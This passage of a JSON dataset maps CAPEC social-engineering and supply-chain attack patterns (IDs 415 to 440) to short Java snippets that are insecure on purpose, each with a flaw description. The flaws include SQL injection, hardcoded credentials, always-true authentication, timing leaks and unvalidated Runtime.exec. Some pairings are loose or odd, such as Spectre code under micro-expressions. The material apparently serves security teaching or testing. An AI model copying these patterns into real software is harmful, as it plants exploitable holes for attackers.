        "code_snippet": "public class DeliveryVerificationSystem {\n    private static final String DELIVERY_ACCESS_PATH = \"/public/deliveries/\";\n    \n    public boolean verifyDeliveryPerson(String badgeId, String deliveryCompany) {\n        // Insecure verification of delivery credentials\n        return true;\n    }\n    \n    public void storeDeliveryCredentials(String badgeId, String accessCode) {\n        try {\n            String credentialsFile = DELIVERY_ACCESS_PATH + badgeId + \".txt\";\n            FileWriter writer = new FileWriter(credentialsFile);\n            writer.write(\"Badge ID: \" + badgeId + \"\\nAccess Code: \" + accessCode);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void processDelivery(String deliveryId, String destination) {\n        // No validation of destination or sender authenticity\n        String deliveryPath = destination + \"/incoming/\" + deliveryId;\n        redirectDelivery(deliveryPath);\n    }\n    \n    private void redirectDelivery(String path) {\n        // Vulnerable delivery routing without proper authentication\n        System.out.println(\"Delivery redirected to: \" + path);\n    }\n}",
        "description": "This vulnerable code demonstrates a delivery verification system that fails to properly authenticate delivery personnel and mishandles sensitive credential information. It stores delivery credentials in a publicly accessible directory, doesn't validate delivery destinations, and lacks proper authentication mechanisms for delivery routing. The system blindly trusts input without verifying the identity of the delivery person or the legitimacy of the delivery destination."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "public class HelpDesk {\n    public static void resetPassword(String username, String phoneNumber) {\n        // No verification of caller identity\n        System.out.println(\"Received password reset request for user: \" + username);\n        \n        // Directly trust the phone number provided\n        String userPassword = getUserPassword(username);\n        String securityQuestion = getSecurityQuestion(username);\n        \n        // Expose sensitive information without proper verification\n        System.out.println(\"Current password is: \" + userPassword);\n        System.out.println(\"Security question is: \" + securityQuestion);\n        \n        // Reset password based on unverified request\n        String newPassword = generateTemporaryPassword();\n        setUserPassword(username, newPassword);\n        System.out.println(\"Password has been reset to: \" + newPassword);\n    }\n    \n    private static String getUserPassword(String username) {\n        // Simulate database lookup\n        return \"currentPassword123\";\n    }\n    \n    private static String getSecurityQuestion(String username) {\n        return \"What is your mother's maiden name?\";\n    }\n    \n    private static String generateTemporaryPassword() {\n        return \"tempPass456\";\n    }\n    \n    private static void setUserPassword(String username, String newPassword) {\n        // Simulate password update in database\n    }\n}",
        "description": "This code demonstrates a vulnerable help desk password reset system that fails to properly verify the identity of the caller. It exposes sensitive information (current password and security questions) and allows password resets without proper authentication, making it susceptible to social engineering attacks through phone-based pretexting. The code violates multiple security principles by trusting user input without verification and exposing sensitive data to potentially unauthorized actors."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "public class HelpDeskSystem {\n    private Database db;\n    private int queryCount = 0;\n    \n    public String getUserData(String username, String requestorId) {\n        queryCount++;\n        \n        // No rate limiting on queries\n        // No proper authentication of requestor\n        if (requestorId.startsWith(\"SUPERVISOR_\")) {\n            String query = \"SELECT * FROM user_data WHERE username = '\" + username + \"'\";\n            return db.executeQuery(query);\n        }\n        \n        // Leaks information through error messages\n        if (db.userExists(username)) {\n            return \"Access denied - User exists but you lack permissions\";\n        } else {\n            return \"Access denied - User not found\";\n        }\n    }\n    \n    public boolean resetUserPassword(String username, String callerPhone) {\n        // No verification of caller identity\n        if (callerPhone.matches(\"\\\\d{10}\")) {\n            String newPassword = \"TempPass123\";\n            db.updatePassword(username, newPassword);\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates a help desk system susceptible to social engineering attacks through multiple vectors: it improperly validates supervisor credentials, leaks information through error messages, lacks request rate limiting, and has weak caller verification for password resets. The code allows unauthorized information disclosure and exhibits observable behavioral differences that could be exploited."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "public class AuthenticationService {\n    private static final String SECRET_KEY = \"MyS3cretK3y123\";\n    \n    public boolean authenticateUser(String username, String token) {\n        // Simple token validation based on obscure algorithm\n        String generatedToken = username + SECRET_KEY;\n        \n        // Log authentication attempt with truncated token\n        System.out.println(\"Auth attempt for user: \" + username + \n                         \" with token: \" + token.substring(0, 5) + \"...\");\n        \n        // Observable timing behavior based on validation steps\n        if (username == null || username.isEmpty()) {\n            sleep(100);\n            return false;\n        }\n        \n        if (token == null || token.isEmpty()) {\n            sleep(200);\n            return false;\n        }\n        \n        // Single factor authentication using simple token comparison\n        return token.equals(generatedToken);\n    }\n    \n    private void sleep(long ms) {\n        try {\n            Thread.sleep(ms);\n        } catch (InterruptedException e) {\n            // Ignore\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including reliance on security through obscurity (hardcoded secret key), observable timing behaviors that leak validation steps, truncation of security information in logs, single-factor authentication, and susceptibility to reflection attacks due to simple token comparison. The code uses a predictable token generation pattern that could be exploited through social engineering techniques."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "public class AuthenticationSystem {\n    private Map<String, String> userCredentials = new HashMap<>();\n    \n    public boolean authenticate(String username, String token) {\n        // Vulnerable: No proper verification of communication channel\n        if (isComplimentaryMessage(token)) {\n            // Automatically trust user if they send a complimentary message\n            System.out.println(\"Thank you for your kind words! How can I help?\");\n            return true;\n        }\n        \n        // Vulnerable: No verification of token source\n        String storedToken = userCredentials.get(username);\n        if (token.startsWith(storedToken)) {\n            // Truncates token comparison, leading to potential bypass\n            return true;\n        }\n        \n        return false;\n    }\n    \n    private boolean isComplimentaryMessage(String message) {\n        return message.toLowerCase().contains(\"great system\") ||\n               message.toLowerCase().contains(\"excellent service\") ||\n               message.toLowerCase().contains(\"thank you\");\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that can be exploited through social engineering. It accepts complimentary messages as a form of authentication and performs improper token verification. The system is susceptible to reflection attacks and token truncation attacks, while also failing to properly verify the source of authentication requests."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "public class SensitiveDataProcessor {\n    private static final String WEAK_CIPHER = \"DES\";\n    private static final String STRONG_CIPHER = \"AES\";\n    \n    public void processClientRequest(Socket clientSocket) throws Exception {\n        ObjectOutputStream out = new ObjectOutputStream(clientSocket.getOutputStream());\n        ObjectInputStream in = new ObjectInputStream(clientSocket.getInputStream());\n        \n        String clientCipher = (String) in.readObject();\n        String selectedCipher = \"\";\n        \n        if(clientCipher.equals(WEAK_CIPHER) || clientCipher.equals(STRONG_CIPHER)) {\n            selectedCipher = clientCipher;  // Accepts client's choice without enforcing strong cipher\n            out.writeObject(\"Cipher accepted: \" + selectedCipher);\n        } else {\n            out.writeObject(\"Invalid cipher\");  // Reveals internal decision process\n            return;\n        }\n        \n        Cipher cipher = Cipher.getInstance(selectedCipher);\n        // Process sensitive data with potentially weak encryption\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including algorithm downgrade (CWE-757) by allowing clients to choose weaker encryption, observable behavioral discrepancy (CWE-205) through different response messages that reveal internal state, and interpretation conflict (CWE-436) in cryptographic negotiation. The code allows clients to negotiate encryption algorithms without enforcing stronger security options, while also leaking information about its internal decision process through different response messages."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "public class LimitedTimeOffer {\n    private static final int MAX_ATTEMPTS = 3;\n    private static int remainingAttempts = MAX_ATTEMPTS;\n    private static final String SECRET_KEY = \"sk_12345\";\n    \n    public static boolean processDiscount(String userInput, String sessionId) {\n        if (remainingAttempts <= 0) {\n            return false;\n        }\n        \n        remainingAttempts--;\n        \n        // Vulnerable single-factor check\n        if (sessionId != null && sessionId.length() > 0) {\n            System.out.println(\"Limited time offer! Only \" + remainingAttempts + \" attempts left!\");\n            \n            // Resource-intensive operation without proper limits\n            while (userInput.length() < 1000) {\n                userInput += userInput;\n            }\n            \n            // Obscurity-based security check\n            return userInput.contains(SECRET_KEY.substring(0, 3));\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code implements a discount processing system that relies on artificial scarcity and contains multiple security issues: it uses a single-factor authentication check, enables resource amplification through unbounded string operations, relies on security through obscurity with a hardcoded secret key, truncates security-relevant information during validation, and reveals system state through observable behavior patterns."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "public class AuthenticationService {\n    private static final String CEO_EMAIL = \"ceo@company.com\";\n    \n    public boolean authenticateUser(String emailHeader, String password) {\n        // Vulnerable: relies only on email header without proper verification\n        if (emailHeader.startsWith(CEO_EMAIL)) {\n            // Automatically grant admin access if email appears to be from CEO\n            grantAdminAccess();\n            return true;\n        }\n        \n        // Simple check without cryptographic verification\n        String userRole = getUserRole(emailHeader);\n        if (userRole.length() > 30) {\n            userRole = userRole.substring(0, 30); // Truncates role info\n        }\n        \n        return validateCredentials(emailHeader, password);\n    }\n    \n    private void grantAdminAccess() {\n        // Grant full system access\n    }\n    \n    private String getUserRole(String email) {\n        // Simply returns role without verification\n        return email.contains(\"admin\") ? \"ADMIN\" : \"USER\";\n    }\n    \n    private boolean validateCredentials(String email, String password) {\n        // Basic validation without proper security measures\n        return true;\n    }\n}",
        "description": "This vulnerable authentication service demonstrates authority impersonation by relying solely on email headers for identity verification. It lacks proper authentication protocols, truncates security-relevant information, and makes access decisions based on a single factor (email). The code is susceptible to impersonation attacks where an attacker can spoof the CEO's email address to gain admin access."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "public class SocialEngineeringTaskHandler {\n    private Map<String, Integer> userTaskCount = new HashMap<>();\n    private static final int TASK_THRESHOLD = 3;\n\n    public boolean handleUserTask(String userId, String taskRequest) {\n        // No proper verification of request source\n        int currentCount = userTaskCount.getOrDefault(userId, 0);\n\n        if (taskRequest.startsWith(\"small_task\")) {\n            // Increment count without proper rate limiting\n            userTaskCount.put(userId, currentCount + 1);\n            \n            // Observable behavior difference based on task count\n            if (currentCount >= TASK_THRESHOLD) {\n                // After multiple small tasks, automatically approve larger tasks\n                return true;\n            }\n            \n            // Process HTTP request without proper validation\n            return processTask(userId, taskRequest);\n        }\n        return false;\n    }\n\n    private boolean processTask(String userId, String taskRequest) {\n        // Reveals processing status through different response patterns\n        if (taskRequest.contains(\"error\")) {\n            return false;\n        }\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates a social engineering attack pattern where small tasks are used to build trust and eventually gain approval for larger actions. It lacks proper request frequency control, exposes observable behavioral differences, has inconsistent HTTP request handling, and fails to properly verify the source of requests."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "public class AuthenticationSystem {\n    private static final String SECRET_KEY = \"secretKey123\";\n    private boolean isAuthenticated = false;\n\n    public boolean authenticate(String username, String token) {\n        // Simple reflection-based authentication\n        if (token.equals(generateToken(username))) {\n            isAuthenticated = true;\n            return true;\n        }\n        return false;\n    }\n\n    private String generateToken(String username) {\n        // Observable behavior - timing varies based on username length\n        try {\n            Thread.sleep(username.length() * 100);\n            return username + SECRET_KEY;\n        } catch (InterruptedException e) {\n            return null;\n        }\n    }\n\n    public void sendSensitiveData(Context context, String data) {\n        if (isAuthenticated) {\n            // Implicit intent for sending sensitive data\n            Intent intent = new Intent();\n            intent.setAction(\"com.example.SEND_DATA\");\n            intent.putExtra(\"sensitive_data\", data);\n            context.sendBroadcast(intent);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a flawed authentication system that relies on a single factor (token), uses an observable timing-based token generation, implements a simple reflection-vulnerable authentication mechanism, and transmits sensitive data using implicit intents. The system's security relies heavily on the obscurity of the SECRET_KEY."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "public class AuthenticationSystem {\n    private static boolean isAdmin = false;\n\n    public static void authenticateUser(String username, String behavior) {\n        // Observe how other users typically authenticate\n        if (behavior.equals(\"standard_login_pattern\")) {\n            System.out.println(\"User behavior matches common pattern\");\n            isAdmin = true;\n        }\n    }\n\n    public static boolean performAdminAction(String action) {\n        if (isAdmin) {\n            if (action.equals(\"view_logs\")) {\n                System.out.println(\"Access granted - behavior was trusted\");\n                return true;\n            }\n        }\n        System.out.println(\"Access denied\");\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates social proof vulnerability where authentication relies on observed behavior patterns. The system trusts users based on matching 'standard' behavior without proper verification, exposing single-factor authentication weakness. The system also leaks information about its authentication state through different responses, making it susceptible to behavioral analysis and reflection attacks."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "public class SecurityAuthenticator {\n    private static final String FRIENDLY_MESSAGE = \"Welcome! Please verify your account to continue\";\n    \n    public boolean authenticateUser(String token) {\n        // Single factor authentication relying only on a simple token\n        if(token != null && token.length() > 0) {\n            displaySecurityPrompt();\n            return true;\n        }\n        return false;\n    }\n    \n    private void displaySecurityPrompt() {\n        UserInterface ui = new UserInterface();\n        // Misleading UI that frames the request positively\n        ui.showMessage(FRIENDLY_MESSAGE);\n        ui.showProgressBar(\"Enhancing your security...\");\n        \n        // Insecure protocol negotiation that can be downgraded\n        String[] protocols = {\"TLSv1.2\", \"TLSv1.1\", \"TLSv1.0\", \"SSLv3\"};\n        for(String protocol : protocols) {\n            if(establishConnection(protocol)) {\n                sendUserData(protocol);\n                break;\n            }\n        }\n    }\n    \n    private boolean establishConnection(String protocol) {\n        // Vulnerable channel establishment without proper endpoint verification\n        return true;\n    }\n    \n    private void sendUserData(String protocol) {\n        String destination = \"server.com\"; // Incorrectly specified destination\n        // No validation of actual destination\n        transmitData(destination);\n    }\n    \n    private void transmitData(String dest) {\n        // Implementation omitted\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that employs social engineering through UI framing, relies on single-factor authentication, uses misleading UI elements, implements vulnerable protocol negotiation, and has insecure communication channel handling. The system uses positive framing to make users feel secure while potentially exposing them to security risks."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "public class SocialMediaInfluencer {\n    private Map<String, User> users = new HashMap<>();\n    private static final String SECRET_KEY = \"abc123\"; // weak security\n\n    public boolean processInfluence(String userId, String action) {\n        User target = users.get(userId);\n        if (validateUser(userId, SECRET_KEY)) { // single factor auth\n            switch(action) {\n                case \"like\":\n                    // amplification attack possible\n                    for(int i = 0; i < target.getFollowerCount(); i++) {\n                        sendNotification(target.getFollowers());\n                    }\n                    break;\n                case \"share\":\n                    // destination not properly validated\n                    String redirectUrl = target.getLastClickedUrl();\n                    redirectToExternalSite(redirectUrl);\n                    break;\n            }\n            return true;\n        }\n        return false;\n    }\n\n    private boolean validateUser(String userId, String key) {\n        return key.equals(SECRET_KEY); // weak validation\n    }\n\n    private void sendNotification(List<String> followers) {\n        // resource amplification\n        followers.forEach(f -> new Thread(() -> \n            notifyUser(f)).start());\n    }\n\n    private void redirectToExternalSite(String url) {\n        // no URL validation\n        executeRedirect(url);\n    }\n}",
        "description": "This code demonstrates a vulnerable social media influence system that allows for manipulation through various attack vectors. It includes weak authentication (single factor), hardcoded secrets, potential resource amplification through unlimited notifications, and unvalidated redirects. The system can be exploited to manipulate user behavior through social engineering and automated amplification attacks."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "public class AuthenticationService {\n    private static boolean isAuthenticated = false;\n\n    public static boolean authenticateUser(String username, String token) {\n        // Simple behavior-based authentication using a single factor\n        if (username.length() > 20) {\n            username = username.substring(0, 20); // Truncate long usernames\n        }\n\n        // Observable behavior - Sleep duration reveals if username exists\n        if (userExists(username)) {\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {}\n        } else {\n            try {\n                Thread.sleep(500);\n            } catch (InterruptedException e) {}\n        }\n\n        // Reflects back authentication attempt without verification\n        if (token.startsWith(\"AUTH_\")) {\n            isAuthenticated = true;\n            return true;\n        }\n        return false;\n    }\n\n    private static boolean userExists(String username) {\n        // Simplified user check\n        return username.toLowerCase().startsWith(\"admin\");\n    }\n\n    public static void setAuthenticationStatus(boolean status) {\n        // External influence allowed on authentication state\n        isAuthenticated = status;\n    }\n}",
        "description": "This vulnerable authentication service demonstrates multiple security issues related to behavioral manipulation. It exhibits timing-based information disclosure, relies on a single authentication factor, allows external influence on authentication state, implements a reflection vulnerability, and truncates security-relevant information. The code makes it possible for attackers to learn about internal state through timing differences and manipulate the authentication process through behavioral analysis."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "public class ChatBot {\n    private Map<String, String> userProfiles = new HashMap<>();\n    private Socket clientSocket;\n\n    public void handleConnection(Socket socket) {\n        this.clientSocket = socket;\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            \n            // No proper authentication or channel verification\n            String username = in.readLine();\n            String messagePattern = in.readLine();\n            \n            // Stores communication patterns without validation\n            userProfiles.put(username, messagePattern);\n            \n            // Mirrors user's communication style without validation\n            String response = adaptCommunicationStyle(messagePattern);\n            out.println(response);\n            \n            // Reflects received messages back without proper verification\n            String message;\n            while ((message = in.readLine()) != null) {\n                // Truncates messages without checking security implications\n                if (message.length() > 100) {\n                    message = message.substring(0, 100);\n                }\n                out.println(\"Mirror: \" + message);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String adaptCommunicationStyle(String pattern) {\n        // Adapts response to match user's communication pattern\n        return \"Adapted response matching pattern: \" + pattern;\n    }\n}",
        "description": "This vulnerable code demonstrates a chatbot that mirrors and adapts to user communication patterns without proper authentication or channel verification. It accepts connections and stores user profiles without validation, allowing potential impersonation and reflection attacks. The code also truncates messages without security checks and creates emergent resources (user profiles) that could be exploited."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "public class EyeTrackingLogin {\n    private String password = \"secret123\";\n    private String enteredPassword = \"\";\n    \n    public boolean verifyPassword(String input) {\n        enteredPassword = \"\";\n        for (int i = 0; i < input.length(); i++) {\n            char c = input.charAt(i);\n            enteredPassword += c;\n            // Vulnerable eye movement feedback\n            if (i < password.length() && c == password.charAt(i)) {\n                moveEyesToRight();\n                delay(500); // Noticeable delay\n            } else {\n                moveEyesToLeft();\n                delay(200);\n            }\n        }\n        return enteredPassword.equals(password);\n    }\n    \n    private void moveEyesToRight() {\n        System.out.println(\"👀 ➡️\"); // Observable behavior\n    }\n    \n    private void moveEyesToLeft() {\n        System.out.println(\"👀 ⬅️\"); // Observable behavior\n    }\n    \n    private void delay(int ms) {\n        try {\n            Thread.sleep(ms);\n        } catch (InterruptedException e) {}\n    }\n}",
        "description": "This code implements a vulnerable password verification system that leaks information through observable eye movements. The system provides visual feedback through eye movements and timing differences for each character entered, allowing an attacker to deduce the correct password by observing the pattern of eye movements and delays. The code violates security principles by exposing internal validation state through observable behavioral differences."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "public class TransientExecutionVulnerability {\n    private static final int CACHE_SIZE = 256;\n    private static byte[] secretData = {0x13, 0x37, 0x42}; // Sensitive data\n    \n    public static int speculativeAccess(int index) {\n        int result = 0;\n        try {\n            // Vulnerable speculative execution\n            if (index < secretData.length) {\n                // Cache timing side-channel\n                int value = secretData[index] & 0xFF;\n                // Intentionally create cache access pattern\n                result = probeArray[value * 4096];\n            }\n        } catch (Exception e) {\n            // Silent exception handling\n        }\n        return result;\n    }\n    \n    private static byte[] probeArray = new byte[256 * 4096];\n    \n    public static void logSensitiveData() {\n        System.out.println(\"Debug: Secret data access at \" + \n            System.currentTimeMillis() + \": \" + \n            Arrays.toString(secretData));\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including transient execution exposure (Spectre-style), excessive debug logging of sensitive data, and a large attack surface through cache timing side-channels. The code speculatively accesses secret data and creates observable cache patterns that could be exploited through timing attacks. It also inappropriately logs sensitive information to debug output."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "public class ErrorHandler {\n    private TemplateEngine templateEngine = new TemplateEngine();\n\n    public void handleError(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String userInput = request.getParameter(\"input\");\n            // Directly using unvalidated input in template\n            String errorTemplate = \"<div>Error processing: ${\" + userInput + \"}\";\n            \n            // Exception with sensitive information\n            throw new SQLException(\"Database connection failed for user: admin, password: secretpass123\");\n        } catch (Exception e) {\n            String errorPage = templateEngine.process(\n                \"<error><message>\" + e.getMessage() + \"</message>\" +\n                \"<details>\" + e.getStackTrace() + \"</details>\" +\n                \"<system>\" + System.getProperty(\"user.dir\") + \"</system></error>\"\n            );\n            response.getWriter().write(errorPage);\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities: improper input validation for template processing, exposure of sensitive information in error messages, and cross-site scripting vulnerabilities in error pages. It uses unvalidated user input directly in a template engine, exposes detailed stack traces and system information, and fails to properly escape special characters in error output."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "public class LoginValidator {\n    private static final Logger logger = Logger.getLogger(\"security_log\");\n\n    public boolean validateUserInput(String username, String password) {\n        // Debug logging with sensitive information\n        logger.debug(\"Login attempt - Username: \" + username + \", Password: \" + password);\n\n        // Vulnerable quote handling in SQL query\n        String query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n\n        // Simple CAPTCHA that can be easily guessed\n        String captcha = \"123456\";\n        return verifyCaptcha(captcha) && executeQuery(query);\n    }\n\n    private boolean verifyCaptcha(String input) {\n        return input.equals(\"123456\");\n    }\n\n    private boolean executeQuery(String query) {\n        // Query execution simulation\n        return true;\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including improper quote handling in SQL queries (CWE-149), logging of sensitive information (CWE-534), and a weak CAPTCHA implementation (CWE-804). The code lacks proper input validation and exposes sensitive information in debug logs while using a predictable CAPTCHA verification system."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "public class MessageTransmitter {\n    private static final int BUFFER_SIZE = 256;\n    \n    public void transmitMessage(String message) {\n        byte[] buffer = new byte[BUFFER_SIZE];\n        String hiddenMessage = \"SUBLIMINAL:BUY_NOW\";\n        \n        // Embed hidden message within regular message\n        String combinedMessage = message + \"|\" + hiddenMessage;\n        \n        // Unsafe buffer copy without size check\n        combinedMessage.getBytes(0, combinedMessage.length(), buffer, 0);\n        \n        // Send over unsecured channel\n        Socket socket = new Socket(\"receiver.com\", 8080);\n        OutputStream out = socket.getOutputStream();\n        out.write(buffer);\n        out.flush();\n    }\n    \n    public void receiveMessage(Socket clientSocket) throws IOException {\n        byte[] buffer = new byte[BUFFER_SIZE];\n        InputStream in = clientSocket.getInputStream();\n        \n        // Read without bounds checking\n        int bytesRead = in.read(buffer);\n        String receivedMessage = new String(buffer);\n        \n        // Process message without integrity verification\n        processMessage(receivedMessage);\n    }\n    \n    private void processMessage(String message) {\n        // Process potentially tampered message\n        System.out.println(message);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including buffer overflow through unchecked buffer copying, cleartext transmission of sensitive data, and lack of message integrity verification. It attempts to embed hidden messages within regular communication, transmitted over an unsecured channel without proper bounds checking or message validation."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "public class UserDatabase {\n    private Map<String, User> users = new HashMap<>();\n\n    public boolean isUsernameAvailable(String username) {\n        long startTime = System.nanoTime();\n        boolean exists = users.containsKey(username);\n        long endTime = System.nanoTime();\n\n        try {\n            // Artificial delay to simulate database lookup\n            if (exists) {\n                Thread.sleep(100);  // Longer delay for existing users\n            } else {\n                Thread.sleep(10);   // Shorter delay for non-existing users\n            }\n        } catch (InterruptedException e) {}\n\n        return !exists;\n    }\n\n    public String validateCaptcha(String userInput) {\n        // Simple predictable CAPTCHA\n        String captcha = \"\" + System.currentTimeMillis() % 1000;\n        if (userInput.equals(captcha)) {\n            return \"Success\";\n        }\n        return \"Failed\";\n    }\n\n    public boolean verifyUser(String username) {\n        // Single source validation without cross-checking\n        return users.containsKey(username);\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities: timing attacks that leak user existence through observable delays, a predictable CAPTCHA implementation, and single-source data validation. The timing differences in the isUsernameAvailable method reveal sensitive information about user existence, the CAPTCHA is easily guessable as it's based on system time, and the verification relies on a single data source without cross-validation."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "public class UnsecureMessageService {\n    private Socket clientSocket;\n    private String sessionKey;\n\n    public void establishConnection(String host, int port) {\n        try {\n            clientSocket = new Socket(host, port);\n            sessionKey = \"SECRET_KEY_\" + System.currentTimeMillis();\n            sendMessage(\"CONNECT:\" + sessionKey);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        try {\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            out.println(message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String receiveMessage() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            return in.readLine();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities in communication channel handling. It fails to properly verify endpoints (CWE-300), doesn't validate message sources (CWE-940), and establishes connections without proper destination verification (CWE-941). The session key is generated using a predictable pattern and timestamp, making the system's behavior observable (CWE-205). The code also allows external influence on the communication sphere by accepting connections without proper validation (CWE-673)."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "public class DeviceManufacturing {\n    private static final String PRODUCTION_CONFIG = \"config/prod.properties\";\n    private static final String TEST_CONFIG = \"config/test.properties\";\n    \n    public void assembleDevice(Component[] components) {\n        Configuration config = loadConfiguration(TEST_CONFIG);  // Using test config in production\n        \n        for (Component component : components) {\n            if (!component.isVerified()) {\n                // Skip verification of third-party components\n                component.setVerified(true);\n            }\n            \n            if (component instanceof SecurityModule) {\n                // Storing sensitive data in plaintext accessible to vendors\n                component.storeCredentials(\"admin\", \"password123\");\n            }\n            \n            // No version control or update mechanism implemented\n            component.setVersion(\"1.0.0-FINAL\");\n            component.disableUpdates();\n        }\n        \n        // Missing technical documentation and implementation details\n        exportDeviceSpecifications(null);\n    }\n    \n    private void exportDeviceSpecifications(Documentation docs) {\n        // Documentation is empty or incomplete\n        releaseToProduction(true);\n    }\n}",
        "description": "This code demonstrates vulnerabilities in a device manufacturing process where components are assembled without proper verification, using test configurations in production, storing sensitive data insecurely, lacking update mechanisms, and missing proper documentation. The code shows insufficient trust validation of components, exposure of confidential information to vendors, improper release configuration, and inability to update components."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "public class DistributionManager {\n    private static final String PROD_CONFIG = \"prod_config.xml\";\n    private static final String DEV_CONFIG = \"dev_config.xml\";\n    \n    public void deployProduct(String version) {\n        // Using development configuration in production\n        Configuration config = loadConfiguration(DEV_CONFIG);\n        \n        // Using outdated vulnerable third-party library\n        OldCryptoLib crypto = new OldCryptoLib(\"1.0.2\");\n        \n        // Exposing sensitive information in distribution metadata\n        Map<String, String> metadata = new HashMap<>();\n        metadata.put(\"internal_key\", \"SK_123456789\");\n        metadata.put(\"debug_mode\", \"true\");\n        \n        // Using untrusted component without verification\n        ThirdPartyComponent component = new ThirdPartyComponent();\n        component.loadUnsigned(\"external_module.dll\");\n        \n        // Unique behavioral pattern that makes the product identifiable\n        if(isValidLicense()) {\n            Thread.sleep(500); // Distinctive timing pattern\n            sendHeartbeat(\"PROD-\" + version);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerabilities in a product distribution system including: releasing with development configuration, using vulnerable third-party components, exposing sensitive information in metadata, using untrusted components without verification, and implementing distinctive behavioral patterns that make the product identifiable. The code lacks proper security controls during the distribution process, making it susceptible to supply chain attacks."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "public class SystemUpdater {\n    private static boolean isUpdateAuthenticated = false;\n    \n    public static void installUpdate(String updatePackage, int versionNumber) {\n        // No validation of update source or integrity\n        if (versionNumber < getCurrentVersion()) {\n            // Allows downgrade to older, potentially vulnerable versions\n            applyUpdate(updatePackage);\n        }\n        \n        // No voltage or timing checks during critical operations\n        performSensitiveOperation();\n    }\n    \n    private static void applyUpdate(String updatePackage) {\n        // Directly applies updates without verification\n        try {\n            Runtime.getRuntime().exec(\"install \" + updatePackage);\n        } catch (Exception e) {\n            // Silent failure allows system to continue in potentially compromised state\n        }\n    }\n    \n    private static void performSensitiveOperation() {\n        // No protection against voltage glitches or timing attacks\n        // No redundancy checks\n        byte[] sensitiveData = getSensitiveData();\n        processData(sensitiveData);\n    }\n    \n    private static int getCurrentVersion() {\n        return 1; // Hardcoded version number\n    }\n}",
        "description": "This vulnerable code demonstrates a system update mechanism that fails to properly validate updates, allows version downgrades, and lacks protection against hardware-level attacks. It has no verification of update authenticity, no protection against voltage/clock glitches during sensitive operations, and no redundancy checks. The code allows installation of potentially malicious updates and downgrading to vulnerable versions, making it susceptible to unauthorized modifications during maintenance."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
